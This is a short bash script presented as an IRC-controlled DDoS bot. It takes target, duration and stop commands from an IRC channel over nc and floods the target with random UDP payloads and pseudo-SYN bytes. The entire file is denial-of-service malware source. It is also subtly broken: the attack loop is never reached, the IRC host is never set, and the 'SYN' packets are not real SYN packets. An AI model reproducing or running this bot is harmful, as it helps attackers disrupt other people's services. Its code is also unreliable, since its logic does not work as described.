#!/bin/bash

# Variables for target information
TARGET_IP=""
TARGET_PORT=0
ATTACK_DURATION=0
IRC_CHANNEL=""

# Function to send packets (UDP)
send_UDP_packet() {
    local payload=$(tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 128) # Generate random payload
    echo -en "$payload" | nc -u $TARGET_IP $TARGET_PORT
}

# Function to send packets (SYN)
send_SYN_packet() {
    local src_ip=$(hostname -I | cut -d' ' -f1) # Get the source IP from hostname
    local src_port=$((RANDOM % 65535))         # Generate a random source port

    echo -en "\x02\x04\x00\x05\x00\x02$src_ip$src_port" | nc $TARGET_IP $TARGET_PORT
}

# Function to handle IRC commands
handle_IRC_command() {
    IFS=' ' read -r -a command <<< "$1"
    case "${command[0]}" in
        "target")
            TARGET_IP="${command[1]}"
            TARGET_PORT="${command[2]}"
            ;;
        "duration")
            ATTACK_DURATION="${command[1]}"
            ;;
        "stop")
            echo "Stopping DDoS attack."
            exit 0
            ;;
    esac
}

# Function to perform the DDoS attack
perform_DDoS_attack() {
    while true; do
        send_UDP_packet
        send_SYN_packet
        sleep 0.1 # Adjust for less intensive packet sending if needed
    done
}

# Main function
main() {
    while true; do
        read -r line <&3

        case "$line" in
            "connect")
                IFS=' ' read -r -a params <<< "$line"
                IRC_CHANNEL="${params[1]}"
                ;;
            *)
                handle_IRC_command "$line"
                ;;
        esac
    done 3< <(nc $IRC_CHANNEL 6667) # Connect to IRC channel

    perform_DDoS_attack
}

main
